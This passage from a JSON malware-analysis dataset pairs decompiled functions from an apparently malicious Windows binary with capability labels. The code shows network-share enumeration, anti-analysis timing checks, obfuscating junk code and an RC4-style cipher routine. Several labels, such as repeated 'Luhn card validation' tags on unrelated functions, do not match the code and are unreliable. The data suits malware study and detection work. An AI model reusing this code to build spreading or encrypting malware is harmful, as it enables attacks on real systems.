            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.00405074(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uVar1 = fcn.00405e30(0x412634, 7, 0xe3228d78, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x412600, 5, 0xfaa041bd, 0);\n        iVar2 = fcn.0040f475(uVar1);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040f418();\n            uStack20 = 0;\n            if (uVar3 != 0) {\n                do {\n                    iVar2 = fcn.0040f43f(uStack20);\n                    if (iVar2 != 0) {\n                        uVar4 = fcn.0040f418();\n                        uStack24 = 0;\n                        if (uVar4 != 0) {\n                            do {\n                                uVar1 = fcn.0040f296(4);\n                                uVar5 = fcn.0040f43f(uStack24);\n                                fcn.0040f3d7(uVar5, 1);\n                                iVar2 = fcn.00404fbb(uVar1, 0);\n                                if (iVar2 != 0) {\n                                    *0x42eac8 = fcn.004063a5();\n                                    iVar6 = *0x42eac4;\n                                    *0x42eac4 = *0x42eac4 + 1;\n                                    *(*0x42eac8 + iVar6 * 4) = iVar2;\n                                }\n                                fcn.0040f362();\n                                uStack24 = uStack24 + 1;\n                            } while (uStack24 < uVar4);\n                        }\n                    }\n                    uStack20 = uStack20 + 1;\n                } while (uStack20 < uVar3);\n            }\n        }\n    }\n    fcn.00404dd1(param_1);\n    uVar1 = fcn.00405e30(0x41263c, 9, 0xccb3c01d, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x412600, 5, 0xfaa041bd, 0);\n        iVar2 = fcn.0040f475(uVar1);\n        if (iVar2 != 0) {\n            uStack20 = 0;\n            if (*0x42eacc != 0) {\n                do {\n                    iVar6 = fcn.00408db6(**(*0x42eabc + uStack20 * 4));\n                    if (iVar6 != 0) {\n                        uVar1 = fcn.0040f2c1(iVar6);\n                        fcn.0040f3d7(uVar1, 0);\n                        fcn.00406445();\n                    }\n                    uStack20 = uStack20 + 1;\n                } while (uStack20 < *0x42eacc);\n            }\n            *0x42eab4 = fcn.00404fbb(iVar2, 2);\n        }\n        uVar1 = fcn.00405e30(0x412648, 7, 0xc2f27b49, 0);\n        iVar2 = fcn.0040f475(uVar1);\n        if (iVar2 != 0) {\n            *0x42ecd8 = fcn.00404fbb(iVar2, 1);\n        }\n    }\n    uVar1 = fcn.00405e30(0x412650, 9, 0xd9a01d21, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x412648, 7, 0xc2f27b49, 0);\n        iVar2 = fcn.0040f475(uVar1);\n        if (iVar2 != 0) {\n            *0x42eac0 = fcn.00404fbb(iVar2, 1);\n        }\n    }\n    return *0x42eac8 != 0;\n}\n",
        "token_count": 1023
    },
    "004053f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053f8(uint arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(2, 1, 0x13, arg_8h, &var_8h);\n    if (iVar1 == 0) {\n        var_4h = 0xffffffff;\n        uVar3 = 0;\n        var_ch = 800;\n        iVar1 = fcn.00406338(0);\n        if (((iVar1 != 0) &&\n            (iVar2 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(var_8h, &var_4h, iVar1, &var_ch),  iVar2 == 0)) &&\n           (var_4h != 0)) {\n            puVar4 = iVar1 + 0x14;\n            do {\n                if ((*(puVar4 + -2) & 2) == 0) {\n                    (*arg_ch)(*puVar4);\n                }\n                else {\n                    fcn.004053f8(puVar4 + -5, arg_ch, arg_10h);\n                }\n                uVar3 = uVar3 + 1;\n                puVar4 = puVar4 + 8;\n            } while (uVar3 < var_4h);\n        }\n        fcn.00406445();\n        (*_sym.imp.MPR.dll_WNetCloseEnum)(var_8h);\n    }\n    return;\n}\n",
        "token_count": 378
    },
    "0040548e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid fcn.0040548e(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t *unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (unaff_ESI[1] < 0x10) {\n        (*_sym.imp.KERNEL32.dll_VirtualAlloc)(unaff_ESI[3] + unaff_ESI[1], *unaff_ESI, 0x1000, 4);\n        unaff_ESI[1] = unaff_ESI[1] + *unaff_ESI;\n    }\n    puVar1 = unaff_ESI[3];\n    puVar1[2] = param_1;\n    puVar1[1] = unaff_EDI[1];\n    *puVar1 = *unaff_EDI;\n    puVar1[3] = param_2;\n    unaff_ESI[3] = unaff_ESI[3] + 0x10;\n    unaff_ESI[1] = unaff_ESI[1] + -0x10;\n    return;\n}\n",
        "token_count": 242
    },
    "004056c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004056c1(uint param_1, uint param_2)\n\n{\n    fcn.0040553c(param_1, fcn.004054d4, param_2, 0, 0);\n    return;\n}\n",
        "token_count": 54
    },
    "004056db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004056db(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_ESI;\n    \n    *0x42eab8 = *0x42eab8 + 1;\n    if (*unaff_ESI == unaff_ESI[1]) {\n        unaff_ESI[1] = unaff_ESI[1] + 1000;\n        iVar1 = fcn.004063a5();\n        unaff_ESI[2] = iVar1;\n    }\n    uVar2 = fcn.004064c8(param_1);\n    *(unaff_ESI[2] + *unaff_ESI * 4) = uVar2;\n    *unaff_ESI = *unaff_ESI + 1;\n    return;\n}\n",
        "token_count": 181
    },
    "00405715": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405715(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    int32_t arg_ch_00;\n    bool bVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    do {\n        puVar5 = *(arg_8h + ((arg_ch + arg_10h) / 2) * 4);\n        uVar1 = *puVar5;\n        uVar2 = puVar5[1];\n        iVar6 = arg_10h;\n        arg_ch_00 = arg_ch;\n        do {\n            puVar5 = *(arg_8h + arg_ch_00 * 4);\n            bVar7 = puVar5[1] < uVar2;\n            if (!bVar7) {\n                if (bVar7 || puVar5[1] == uVar2) goto code_r0x00405756;\n                do {\n                    do {\n                        arg_ch_00 = arg_ch_00 + 1;\n                        puVar5 = *(arg_8h + arg_ch_00 * 4);\n                        bVar7 = puVar5[1] < uVar2;\n                    } while (!bVar7 && puVar5[1] != uVar2);\n                    if (bVar7) break;\ncode_r0x00405756:\n                } while (uVar1 < *puVar5);\n            }\n            puVar5 = *(arg_8h + iVar6 * 4);\n            bVar7 = uVar2 <= puVar5[1];\n            if (!bVar7 || puVar5[1] == uVar2) {\n                if (bVar7) goto code_r0x00405772;\n                do {\n                    do {\n                        iVar6 = iVar6 + -1;\n                        puVar5 = *(arg_8h + iVar6 * 4);\n                        bVar7 = puVar5[1] < uVar2;\n                    } while (bVar7);\n                    if (!bVar7 && puVar5[1] != uVar2) break;\ncode_r0x00405772:\n                } while (*puVar5 < uVar1);\n            }\n            if (iVar6 < arg_ch_00) break;\n            puVar5 = *(arg_8h + arg_ch_00 * 4);\n            puVar3 = *(arg_8h + iVar6 * 4);\n            uVar4 = puVar5[1];\n            bVar7 = uVar4 < puVar3[1];\n            if ((bVar7 || uVar4 == puVar3[1]) && ((bVar7 || (*puVar5 < *puVar3)))) {\n                *(arg_8h + iVar6 * 4) = puVar5;\n                *(arg_8h + arg_ch_00 * 4) = puVar3;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            iVar6 = iVar6 + -1;\n        } while (arg_ch_00 <= iVar6);\n        if (arg_ch_00 < arg_10h) {\n            fcn.00405715(arg_8h, arg_ch_00, arg_10h);\n        }\n        arg_10h = iVar6;\n        if (iVar6 <= arg_ch) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 781
    },
    "004057c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057c3(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        fcn.00405715(param_1[2], 0, *param_1 + -1);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1, param_1);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00405b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405b20(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint arg_ch;\n    uint lpSubKey;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *arg_10h;\n    uint8_t uStack209;\n    uint32_t uStack208;\n    uchar auStack204 [204];\n    \n    arg_10h = &uStack208;\n    uStack209 = 0;\n    arg_ch = fcn.00406209(0x4126b4, 0xb, 0xea415f72, param_1);\n    lpSubKey = fcn.00406209(0x4126c0, 0x1f, 0xc3c18949);\n    uVar3 = fcn.00405a94(lpSubKey, arg_ch, arg_10h);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrChrW;\n    if (uVar3 != 0) {\n        uStack208 = uVar3;\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrChrW)(uVar3, 0x2d);\n        pcVar2 = _sym.imp.SHLWAPI.dll_StrCpyNW;\n        if (iVar4 != 0) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyNW)(auStack204, uVar3, (iVar4 - uVar3 >> 1) + 1);\n            (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, 0x42eda8);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(0x42eda8, &stack0xffffff20);\n            iVar4 = iVar4 + 2;\n            iVar5 = (*pcVar1)(iVar4, 0x2d);\n            if (iVar5 != 0) {\n                (*pcVar2)(0x42efb0, iVar4, (iVar5 - iVar4 >> 1) + 1);\n                iVar5 = iVar5 + 2;\n                iVar4 = (*pcVar1)(iVar5, 0x2d);\n                if (iVar4 != 0) {\n                    (*pcVar2)(0x42ece0, iVar5, (iVar4 - iVar5 >> 1) + 1);\n                    iVar4 = iVar4 + 2;\n                    iVar5 = (*pcVar1)(iVar4, 0x2d);\n                    if (iVar5 != 0) {\n                        (*pcVar2)(0x42f078, iVar4, (iVar5 - iVar4 >> 1) + 1);\n                        uStack209 = 1;\n                    }\n                }\n            }\n        }\n        uVar3 = fcn.00406445();\n    }\n    return uVar3 & 0xffffff00 | uStack209;\n}\n",
        "token_count": 639
    },
    "00405c2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00405c2a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    *0x414be4 = *0x414be4 ^ arg_8h * 0x9f;\n    iVar1 = arg_8h + -0x80;\n    if ((arg_8h * 0xd1 - iVar1 == 0 || arg_8h * 0xd1 < iVar1) &&\n       ((*0x414be4 - 0xab <= *0x4148e1 * 4 || (arg_8h << 0x13 == (*0x414be4 | 0x94))))) {\n        *0x414be4 = *0x414be4 << (arg_8h + 0xadU & 0x1f);\n    }\n    *0x414be4 = *0x414be4 + arg_8h * 0x36;\n    return 0x6f;\n}\n",
        "token_count": 218
    },
    "00405c92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405c92(void)\n\n{\n    uint var_dfh;\n    uint var_a6h;\n    \n    sub.ntdll.dll_memset(&var_dfh, 0, 0xd9);\n    *0x414be4 = ((*0x414be4 >> (var_a6h + 0x84U & 0x1f)) >> (*0x4148e1 & 0x1f)) - *0x4148e1;\n    return;\n}\n",
        "token_count": 117
    },
    "00405cd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405d3f)\n// WARNING: Removing unreachable block (ram,0x00405d53)\n// WARNING: Removing unreachable block (ram,0x00405d5a)\n// WARNING: Removing unreachable block (ram,0x00405d5c)\n\nuint __cdecl fcn.00405cd4(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x4148e2 + 0xe2;\n    if ((((arg_ch | uVar1 >> 0x1f) == 0) && ((arg_8h | uVar1) == 0xee)) && (*0x4148e2 == 0xe)) {\n        if (0 < *0x414be4) {\n            return 0;\n        }\n        if (*0x414be4 < 0) {\n            return 0;\n        }\n        if (0xed < *0x414be4) {\n            return 0;\n        }\n        if ((*0x414be4 & 5) != *0x4148e1) {\n            return 0;\n        }\n        if ((-1 < *0x414be4 * 0xae) && (*0x414be4 * 0xae < 0x71)) {\n            return 0;\n        }\n    }\n    else {\n        *0x414be4 = *0x414be4 ^ *0x4148e1;\n    }\n    return 0;\n}\n",
        "token_count": 338
    },
    "004061f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004061f2(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00405e30(param_1, param_2, param_3, 0);\n    return;\n}\n",
        "token_count": 52
    },
    "00406209": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406209(uint param_1, uint param_2, uint param_3)\n\n{\n    *0x414be4 = *0x4148e3;\n    fcn.00405e30(param_1, param_2, param_3, 1);\n    return;\n}\n",
        "token_count": 67
    },
    "0040648b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040648b(void)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.0040622c();\n    if (cVar1 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        cVar1 = fcn.0040623e(in_EAX);\n        if (cVar1 != '\\0') {\n            sub.ntdll.dll_memset();\n            fcn.00406445();\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0040659d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040659d(char param_1)\n\n{\n    *0x4148e4 = *0x4148e4 << (param_1 * -0x4b & 0x1fU);\n    *0x4148e4 = *0x4148e4 ^ *0x4141e4;\n    if (((*0x4148e4 - 0xd7 < *0x4141e4 >> 0x1f) || (0 < *0x4141e4)) || (*0x4148e4 * 0x47 < *0x4141e4 + 0xfc)) {\n        *0x4148e4 = *0x4148e4 + *0x4141e4 * -0x52;\n        *0x4141e4 = *0x4141e4 << (*0x414bc8 & 0x1f);\n    }\n    return *0x4141e4 & 0xffffff00 | *0x414be0;\n}\n",
        "token_count": 231
    },
    "004066a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004066a9(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    if (*0x4141e4 + 0xcb == param_1) {\n        iVar1 = 1;\n        iVar2 = 0;\n        do {\n            do {\n                bVar3 = iVar1 != 0;\n                iVar1 = iVar1 + -1;\n                iVar2 = iVar2 + -1 + bVar3;\n            } while (iVar2 != 0);\n        } while (iVar1 != 0);\n    }\n    if ((in_EAX <= param_1) || (param_1 + 0x9b == in_EAX)) {\n        *0x4141e4 = *0x4141e4 + *0x414bc8 * -0xaa;\n    }\n    if ((((*0x4141e4 != param_1 * 0x47) && (param_1 - 0x2c != (in_EAX ^ 0x54))) && (0x20904f6 < param_1 * 0x4e)) &&\n       ((-1 < *0x4141e4 || (param_1 <= *0x4141e4)))) {\n        param_1 = *0x4141e4;\n    }\n    *0x4141e4 = *0x4141e4 << (param_1 + 0x1cU & 0x1f);\n    return *0x414be0;\n}\n",
        "token_count": 351
    },
    "00406749": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406749(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    uint16_t uVar5;\n    int16_t iVar6;\n    char *pcVar7;\n    char *unaff_EDI;\n    int32_t var_8h;\n    uchar auStack8 [2];\n    uint var_2h;\n    \n    uVar5 = 0;\n    *0x4141e4 = *0x4141e4 << (-(*0x4148e4 | 0x25) - 0x2d & 0x1f);\n    cVar2 = fcn.00406510(*0x4148e4 & 0xffff, 0x222c199);\n    *0x4141e4 = *0x4141e4 - ((in_ECX >> 0x18) - cVar2);\n    iVar4 = fcn.004066a9();\n    *0x4141e4 = *0x4141e4 ^ iVar4 * 0x72;\n    uVar1 = *0x4141e4;\n    *(unaff_EDI + 0x100) = 0;\n    uVar3 = fcn.0040659d(*0x414bd8);\n    var_2h._1_1_ = uVar1;\n    _auStack8 = (var_2h._1_1_ | uVar3) << 0x18;\n    pcVar7 = unaff_EDI;\n    do {\n        _auStack8 = (var_2h._1_1_ ^ *0x4141e4 + 0x4fU) << 0x18;\n        *pcVar7 = uVar5;\n        fcn.0040659d(0x4f6a);\n        uVar5 = uVar5 + 1;\n        pcVar7 = pcVar7 + 1;\n    } while (uVar5 < 0x100);\n    iVar6 = 3;\n    do {\n        if (*0x4141e4 == 0) {\n            *0x4141e4 = 0 << (*0x414bd8 + 0x99U & 0x1f);\n            if ((*0x414be0 + -0xc3 <= *0x4141e4) ||\n               ((*0x4141e4 >> 0x1f <= *0x414bcc && ((*0x4141e4 >> 0x1f < *0x414bcc || (*0x4141e4 < *0x414bc8))))))\n            goto code_r0x0040682c;\n        }\n        else {\ncode_r0x0040682c:\n            fcn.00406729(0x997f9d);\n        }\n        iVar6 = iVar6 + -1;\n        if (iVar6 < 1) {\n            var_8h = 0x100;\n            pcVar7 = unaff_EDI;\n            do {\n                cVar2 = fcn.004066a9();\n                var_2h._1_1_ = var_2h._1_1_ >> (cVar2 * -100 & 0x1fU);\n                cVar2 = *pcVar7;\n                *0x4141e4 = *0x4141e4 - var_2h._1_1_;\n                uVar3 = (_auStack8 >> 8) + *((_auStack8 >> 0x10 & 0xff) + arg_8h) + cVar2;\n                *pcVar7 = unaff_EDI[uVar3];\n                unaff_EDI[uVar3] = cVar2;\n                cVar2 = fcn.0040659d(0x77e8);\n                if ((var_2h._1_1_ & 0x7cU) <= cVar2 + 0x2b) {\n                    *0x4141e4 = *0x4141e4 << (-(*0x4148e4 | 0x25) - 0x2b & 0x1f);\n                }\n                _auStack8 = CONCAT11((_auStack8 >> 0x10) + '\\x01', uVar3) << 8;\n                var_2h._0_1_ = _auStack8 >> 0x10;\n                if (var_2h == arg_ch) {\n                    *0x4141e4 = 0;\n                    _auStack8 = _auStack8 & 0xff00ffff;\n                    fcn.00406606(*0x4144c4);\n                }\n                _auStack8 = var_2h._1_1_ << 0x18 | _auStack8;\n                *0x4141e4 = *0x414bc8 * *0x4141e4;\n                pcVar7 = pcVar7 + 1;\n                var_8h = var_8h + -1;\n            } while (var_8h != 0);\n            *0x4141e4 = *0x4141e4 | var_2h._1_1_;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1201
    },
    "00406bdd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406d70)\n\nvoid __cdecl fcn.00406bdd(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint var_110h;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    *0x4141e4 = *0x4141e4 * 0x23 & 0x46;\n    var_8h = 0;\n    cVar1 = fcn.00409e78(arg_8h, arg_ch & 0xffff);\n    if (cVar1 == '\\0') {\n        iVar3 = fcn.004066a9();\n        var_8h = iVar3 - 0xe1;\n    }\n    else {\n        *0x4141e4 = fcn.00406606(0x8e9875);\n        *0x4141e4 = *0x4141e4 & 0xffff;\n        cVar1 = fcn.00409e78(arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            uVar2 = fcn.00406729(0xc6dca8);\n            *0x4141e4 = *0x4141e4 << (uVar2 & 0x1f);\n        }\n        else {\n            if (((arg_18h == 0) && (*0x4141e4 = *0x414bc8,  arg_18h = arg_10h,  *0x414bc8 == 0)) &&\n               (cVar1 = fcn.0040659d(*0x414bd8 & 0xffff),  *0x4141e4 - 0x51 <= cVar1 >> 4)) {\n                *0x4141e4 = *0x4141e4 + 0x1c41b3c;\n            }\n            fcn.00406510(*0x4148e4 & 0xffff, *0x414bd0);\n            cVar1 = fcn.00409e9f(arg_18h, arg_14h);\n            if (cVar1 == '\\0') {\n                uVar2 = *0x4148e4 | 0x25;\n                arg_ch = 5;\n                do {\n                    *0x4141e4 = *0x4141e4 << (*0x414bd8 - uVar2 & 0x1f);\n                    if ((((*0x414be0 & 0x4cU) < *0x4141e4 + 0x95) &&\n                        (*0x4141e4 = *0x4141e4 << (-uVar2 - 0x29 & 0x1f),  *0x414be0 * 0x6b < *0x4141e4)) &&\n                       (0x28 < arg_ch._3_1_)) {\n                        *0x4141e4 = *0x4141e4 >> (*0x414bc8 & 0x1f);\n                    }\n                    arg_ch = arg_ch + -1;\n                } while (arg_ch != 0);\n            }\n            else {\n                fcn.00406729(0x24b4e05);\n                *0x4141e4 = *0x4141e4 + 0x2090432;\n                fcn.00406749(arg_8h, arg_ch);\n                fcn.00406729(0x2090432);\n                fcn.004068fd(arg_10h, arg_18h, arg_14h);\n                *0x4141e4 = *0x4141e4 + 0x1e516e5;\n            }\n        }\n    }\n    *0x4141e4 = *0x4141e4 & var_8h;\n    return;\n}\n",
        "token_count": 893
    },
    "00406dc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406dc9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t in_ECX;\n    int32_t arg_18h;\n    uint32_t var_4h;\n    \n    if ((*0x4141e4 == *0x414bc8) && (*0x4141e4 >> 0x1f == *0x414bcc)) {\n        var_4h = in_ECX ^ *0x4141e4 + 0xf7;\n    }\n    else {\n        *0x4141e4 = *0x4141e4 << (0x2a - (*0x4148e4 | 0x25) & 0x1f);\n        var_4h = in_ECX;\n    }\n    arg_18h = 0;\n    var_4h = var_4h ^ *0x4141e4;\n    uVar1 = fcn.00406729(0x22241f1);\n    *0x4141e4 = *0x4141e4 << (uVar1 & 0x1f);\n    cVar2 = fcn.00409e78(arg_8h, 6);\n    if (cVar2 == '\\0') {\n        *0x4141e4 = *0x414be0 + 0x47;\n    }\n    else {\n        *0x4141e4 = *0x4141e4 >> (var_4h & 0x1f);\n        cVar2 = fcn.00409e78(arg_ch, arg_10h);\n        if (cVar2 == '\\0') {\n            *0x4141e4 = 0;\n        }\n        else {\n            arg_18h = fcn.00406338(0);\n            cVar2 = *0x4141e4;\n            if (arg_18h == 0) {\n                fcn.00406606(0x159b16f);\n            }\n            else {\n                fcn.00406510(*0x4148e4 & 0xffff, 0x27b67ae);\n                fcn.00406bdd(arg_8h, 6, arg_ch, arg_10h, arg_18h);\n                *0x4141e4 = *0x4141e4 + (var_4h >> (cVar2 + 0x80U & 0x1f));\n            }\n        }\n    }\n    *0x4141e4 = *0x4141e4 << (0x32 - (*0x4148e4 | 0x25) & 0x1f);\n    return arg_18h;\n}\n",
        "token_count": 613
    },
    "00406fe5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00406fe5(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    if (in_EAX != NULL) {\n        fcn.00409d40();\n        if ((*in_EAX == 0) || (iVar1 = fcn.00409ffd(*in_EAX, in_EAX + 9),  iVar1 == 0)) {\n            uVar2 = 1;\n        }\n        fcn.00409dae();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 135
    },
    "00407070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407070(void)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *unaff_EDI;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t *var_4h;\n    \n    if (unaff_EDI != NULL) {\n        fcn.00409d40();\n        var_ch = 0;\n        var_8h = 0;\n        if (*unaff_EDI != 0) {\n            puVar2 = unaff_EDI + 9;\n            var_4h = puVar2;\n            do {\n                if (*puVar2 != 0) {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar2, 0);\n                    if (iVar1 == 0) {\n                        fcn.00408489();\n                        *puVar2 = 0;\n                    }\n                    else {\n                        var_ch = var_ch + 1;\n                        *var_4h = *puVar2;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                var_8h = var_8h + 1;\n                puVar2 = puVar2 + 1;\n            } while (var_8h < *unaff_EDI);\n        }\n        *unaff_EDI = var_ch;\n        fcn.00409dae();\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "00407428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407428(uint *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = *0x42e42c;\n    cVar1 = fcn.00409e9f(arg_8h, 4);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00409e9f(0x42e410, 4),  cVar1 != '\\0')) {\n        var_24h = 0;\n        var_10h = fcn.0040a235();\n        var_14h = fcn.0040a235();\n        uVar2 = fcn.0040a235();\n        var_2ch = uVar2;\n        var_4h = fcn.0040a235();\n        var_8h = fcn.0040a235();\n        var_18h = fcn.0040a235();\n        var_1ch = fcn.0040a235();\n        var_20h = fcn.0040a235();\n        arg_8h_00 = fcn.0040a235();\n        var_30h = arg_8h_00;\n        arg_8h_01 = fcn.0040a235();\n        var_34h = arg_8h_01;\n        var_38h = fcn.0040a235();\n        var_ch = fcn.0040a235();\n        var_3ch = fcn.0040a235();\n        var_40h = fcn.0040a235();\n        var_44h = fcn.0040a235();\n        fcn.004072a4(uVar2, var_4h, var_8h, var_10h, var_14h, var_18h, var_1ch, var_20h, var_28h);\n        iVar3 = fcn.0040cf7b(0, 0);\n        fcn.0040a79c(iVar3 + -1);\n        fcn.0040a5cd(arg_8h_00, var_4h, uVar2);\n        fcn.0040a5cd(arg_8h_01, var_8h, uVar2);\n        iVar3 = fcn.0040a3bd();\n        if (iVar3 == 0) {\n            puVar4 = fcn.00406338(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 2;\n                uVar2 = fcn.0040a235();\n                puVar4[1] = uVar2;\n                fcn.0040a3fe();\n                uVar2 = fcn.0040a235();\n                puVar4[2] = uVar2;\n                fcn.0040a3fe();\n                uVar2 = fcn.0040a235();\n                puVar4[3] = uVar2;\n                fcn.0040a3fe();\n                *arg_8h = puVar4;\n            }\n            puVar4 = fcn.00406338(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 1;\n                